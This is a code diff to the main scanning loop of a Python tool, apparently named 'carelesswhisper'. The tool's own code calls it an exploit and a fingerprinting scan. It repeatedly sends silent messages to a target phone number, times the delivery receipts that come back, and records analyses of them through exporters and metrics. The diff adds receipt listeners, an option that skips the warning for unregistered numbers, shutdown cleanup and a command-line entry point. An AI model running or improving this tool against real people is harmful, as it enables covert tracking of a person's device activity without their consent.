@@ -2,18 +2,21 @@ import asyncio
 import logging
 from logging import getLogger
 from typing import Callable, Awaitable, Optional, Protocol
-from argparse import ArgumentParser
 from datetime import datetime
 
 from carelesswhisper.exporters.base import BaseExporter
-from carelesswhisper.messengers.base import BaseMessenger, BaseReceiptReport
+from carelesswhisper.messengers.base import (
+    BaseMessenger,
+    BaseReceiptReport,
+    ReceiptEvent,
+    SentMessage,
+)
 from carelesswhisper.metrics import Metrics
 from carelesswhisper.fingerprint import Fingerprint, FingerprintAnalysis
 from carelesswhisper.exploit import Exploit
 from carelesswhisper.tools.util import confirm_number, get_exporter, get_messenger
 
 from .config import Settings
-
 
 logger = getLogger(__name__)
 
@@ -32,6 +35,7 @@ class SettingsProtocol(Protocol):
     metrics_port: int
     delay_between_requests: float
     concurrent_requests: int
+    ignore_unregistered_warning: bool
 
 
 async def start(
@@ -56,7 +60,11 @@ async def start(
         on_analysis: Optional callback called when analysis is updated.
     """
     logger.info(f"Starting fingerprinting scan for {settings.phone_number}")
-    await confirm_number(settings.phone_number, messenger)
+    await confirm_number(
+        settings.phone_number,
+        messenger,
+        settings.ignore_unregistered_warning,
+    )
 
     # Initialize metrics if enabled
     metrics = Metrics() if settings.metrics else None
@@ -67,6 +75,33 @@ async def start(
         f"Concurrency level set to: {settings.concurrent_requests} requests in parallel."
     )
     semaphore = asyncio.Semaphore(settings.concurrent_requests)
+
+    async def publish_analysis() -> None:
+        effective_ping_interval_ms = (settings.delay_between_requests * 1000) / max(
+            settings.concurrent_requests, 1
+        )
+        analysis = await fingerprint.analyze(effective_ping_interval_ms)
+        if exporter:
+            exporter.save_analysis(analysis)
+        if metrics:
+            metrics.report_analysis(settings.phone_number, analysis)
+        if on_analysis:
+            await on_analysis(analysis)
+
+    async def on_receipt_internal(receipt: ReceiptEvent) -> None:
+        if exporter:
+            exporter.save_receipt_event(receipt)
+        await publish_analysis()
+
+    async def on_sent_message_internal(message: SentMessage) -> None:
+        if exporter:
+            exporter.save_sent_message(message)
+        # A receipt can race the outgoing message echo or send completion.
+        if any(
+            message.msg_id in event.message_ids
+            for event in exploit.get_receipt_events()
+        ):
+            await publish_analysis()
 
     async def on_report_internal(report: BaseReceiptReport):
         """Internal handler for reports that chains to user callbacks."""
@@ -91,10 +126,7 @@ async def start(
         if on_report:
             await on_report(report)
 
-        # Perform analysis and call analysis callback
-        analysis = await fingerprint.analyze()
-        if on_analysis:
-            await on_analysis(analysis)
+        await publish_analysis()
 
     async def concurrent_worker():
         """Worker that continuously sends requests with semaphore protection on sends."""
@@ -102,12 +134,12 @@ async def start(
             # Acquire semaphore to limit concurrent in-flight requests
             async with semaphore:
                 # Send a silent message to trigger delivery receipt
+                sent_time = datetime.now()
                 msg_id = await messenger.send_silent_message(settings.phone_number)
                 logger.info(
                     f"Sent silent message to {settings.phone_number} to trigger delivery receipt (ID: {msg_id})"
                 )
-                # Record the send time
-                exploit._message_send_times[msg_id] = datetime.now()
+                await exploit.track_message(msg_id, sent_time)
 
             # Sleep between requests without holding the semaphore
             # This allows other workers to send messages while we wait
@@ -115,6 +147,12 @@ async def start(
 
     # Register the report listener with the exploit
     exploit.add_listener(on_report_internal)
+    exploit.add_receipt_listener(on_receipt_internal)
+    exploit.add_sent_message_listener(on_sent_message_internal)
+    messenger.receipt_target = settings.phone_number
+    messenger.on_receipt = exploit.on_receipt
+    messenger.on_message_sent = exploit.observe_sent_message
+    messenger.on_delivered = exploit.on_delivery
 
     # Create multiple concurrent workers
     # Start the exploit's listening but not its sending loop
@@ -162,7 +200,15 @@ async def _connect_and_run(
 
     # Wait for both tasks to complete (they run indefinitely)
     logger.info("Fingerprinting in progress... Press Ctrl+C to stop")
-    await asyncio.gather(connection_task, scanning_task)
+    try:
+        await asyncio.gather(connection_task, scanning_task)
+    finally:
+        exploit.running = False
+        for task in (connection_task, scanning_task):
+            if not task.done():
+                task.cancel()
+        await asyncio.gather(connection_task, scanning_task, return_exceptions=True)
+        await messenger.stop()
 
 
 async def main(
@@ -224,7 +270,8 @@ async def main(
     )
 
 
-if __name__ == "__main__":
+def cli():
+    """Console entry point for the fingerprint tool."""
     import sys
     from argparse import ArgumentParser
     from carelesswhisper.tools.fingerprint.config import Settings
@@ -262,7 +309,8 @@ if __name__ == "__main__":
     parser.add_argument(
         "--exporter",
         type=str,
-        help="Exporter to use for saving results (e.g., csv)",
+        choices=["csv", "jsonl", "sqlite"],
+        help="Exporter for saving results and analysis snapshots",
     )
     parser.add_argument(
         "--metrics",
@@ -323,3 +371,7 @@ if __name__ == "__main__":
     except Exception as e:
         logger.error(f"Fatal error: {e}", exc_info=True)
         sys.exit(1)
+
+
+if __name__ == "__main__":
+    cli()
